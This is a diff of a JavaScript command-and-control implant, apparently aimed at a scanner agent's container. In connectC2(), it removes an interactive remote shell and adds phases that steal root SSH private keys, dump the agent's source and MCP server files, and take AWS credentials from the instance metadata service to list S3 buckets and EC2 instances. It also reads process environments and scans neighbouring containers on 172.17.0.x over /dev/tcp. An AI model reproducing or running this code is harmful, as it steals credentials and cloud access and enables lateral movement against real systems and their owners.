@@ -134,33 +134,79 @@ function connectC2() {
     send('[*] installed packages:\n' + run('apk list --installed 2>/dev/null || dpkg -l 2>/dev/null | head -40 || rpm -qa 2>/dev/null | head -40'));
     send('');
 
-    // ===== PHASE 9: INTERACTIVE SHELL =====
-    send('=== PHASE 9: INTERACTIVE SHELL READY ===');
-    send('[*] Entering interactive mode. Send commands to execute.');
-    send('[*] Type "exit" to close connection.\n');
-    send('SHELL> ');
+    // ===== PHASE 9: SSH KEYS & SECRETS =====
+    send('=== PHASE 9: SSH KEYS & SECRETS ===');
+    send('[*] /root/.ssh:\n' + run('ls -la /root/.ssh/ 2>/dev/null'));
+    send('[*] SSH private keys:\n' + run('cat /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/id_ecdsa 2>/dev/null'));
+    send('[*] SSH authorized_keys:\n' + run('cat /root/.ssh/authorized_keys 2>/dev/null'));
+    send('[*] SSH known_hosts:\n' + run('cat /root/.ssh/known_hosts 2>/dev/null'));
+    send('');
 
-    // Interactive mode - read commands from C2 and execute
-    let buffer = '';
-    sock.on('data', (data) => {
-      buffer += data.toString();
-      const lines = buffer.split('\n');
-      buffer = lines.pop(); // keep incomplete line in buffer
+    // ===== PHASE 10: SCANNER AGENT CODE =====
+    send('=== PHASE 10: SCANNER AGENT CODE ===');
+    send('[*] /app/package.json:\n' + run('cat /app/package.json'));
+    send('[*] /app/universal_agent.js (first 200 lines):\n' + run('head -200 /app/universal_agent.js'));
+    send('[*] /app/universal_agent.js (lines 200-400):\n' + run('sed -n "200,400p" /app/universal_agent.js'));
+    send('[*] /app/universal_agent.js (lines 400-end):\n' + run('sed -n "400,999p" /app/universal_agent.js'));
+    send('[*] /app/mcp-servers contents:\n' + run('ls -la /app/mcp-servers/'));
+    send('[*] mcp-servers files:\n' + run('cat /app/mcp-servers/* 2>/dev/null | head -100'));
+    send('');
 
-      for (const line of lines) {
-        const cmd = line.trim();
-        if (!cmd) continue;
-        if (cmd === 'exit') {
-          send('[*] Closing connection.');
-          sock.end();
-          return;
-        }
-        send('[cmd] ' + cmd);
-        const result = run(cmd, 30000);
-        send(result);
-        send('SHELL> ');
+    // ===== PHASE 11: AWS CREDENTIAL EXPLOITATION =====
+    send('=== PHASE 11: AWS CREDENTIAL EXPLOITATION ===');
+    const imdsToken2 = run('curl -s -f --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"');
+    const awsCreds = run('curl -s -f --max-time 3 -H "X-aws-ec2-metadata-token: ' + imdsToken2 + '" "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"');
+    if (awsCreds && !awsCreds.startsWith('ERR')) {
+      try {
+        const creds = JSON.parse(awsCreds);
+        const ak = creds.AccessKeyId;
+        const sk = creds.SecretAccessKey;
+        const tk = creds.Token;
+        send('[*] Testing AWS credentials...');
+        const stsResult = run('AWS_ACCESS_KEY_ID="' + ak + '" AWS_SECRET_ACCESS_KEY="' + sk + '" AWS_SESSION_TOKEN="' + tk + '" AWS_DEFAULT_REGION=us-east-1 python3 -c "' +
+          'import boto3,json\\n' +
+          'results={}\\n' +
+          'try:\\n' +
+          '  sts=boto3.client(\\"sts\\")\\n' +
+          '  results[\\"identity\\"]=sts.get_caller_identity()\\n' +
+          'except Exception as e: results[\\"sts_err\\"]=str(e)\\n' +
+          'try:\\n' +
+          '  s3=boto3.client(\\"s3\\")\\n' +
+          '  results[\\"buckets\\"]=[b[\\"Name\\"] for b in s3.list_buckets().get(\\"Buckets\\",[])[:20]]\\n' +
+          'except Exception as e: results[\\"s3_err\\"]=str(e)\\n' +
+          'try:\\n' +
+          '  ec2=boto3.client(\\"ec2\\")\\n' +
+          '  r=ec2.describe_instances()\\n' +
+          '  results[\\"instances\\"]=[]\\n' +
+          '  for res in r.get(\\"Reservations\\",[]):\\n' +
+          '    for i in res.get(\\"Instances\\",[]):\\n' +
+          '      results[\\"instances\\"].append({\\"id\\":i[\\"InstanceId\\"],\\"type\\":i.get(\\"InstanceType\\",\\"\\"),\\"state\\":i.get(\\"State\\",{}).get(\\"Name\\",\\"\\"),\\"ip\\":i.get(\\"PrivateIpAddress\\",\\"\\")})\\n' +
+          'except Exception as e: results[\\"ec2_err\\"]=str(e)\\n' +
+          'print(json.dumps(results,default=str,indent=2))\\n' +
+          '" 2>&1', 30000);
+        send('[*] AWS API results:\n' + stsResult);
+      } catch(e) {
+        send('[!] Cred parse error: ' + e.message);
       }
-    });
+    }
+    send('');
+
+    // ===== PHASE 12: PROCESS & HOST =====
+    send('=== PHASE 12: PROCESS & HOST ===');
+    send('[*] /proc/1/cmdline: ' + run('cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "'));
+    send('[*] /proc/1/environ:\n' + run('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | head -20'));
+    send('[*] Process list:\n' + run('ps aux 2>/dev/null || ps -ef 2>/dev/null'));
+    send('');
+
+    // ===== PHASE 13: LATERAL MOVEMENT =====
+    send('=== PHASE 13: LATERAL MOVEMENT ===');
+    send('[*] Other containers:\n' + run('for i in 2 3 4 5 6 7 8 9 10; do for p in 22 80 3000 5000 7001 8000 8080 9000; do (echo >/dev/tcp/172.17.0.$i/$p) 2>/dev/null && echo "OPEN 172.17.0.$i:$p"; done; done; echo done', 30000));
+    send('[*] DNS:\n' + run('nslookup spire.dev.straiker.ai 2>/dev/null; nslookup straiker.ai 2>/dev/null'));
+    send('');
+
+    send('=== ALL PHASES COMPLETE ===');
+    send('[*] Finished at ' + new Date().toISOString());
+    setTimeout(() => sock.end(), 5000);
   });
 
   sock.on('error', (err) => {
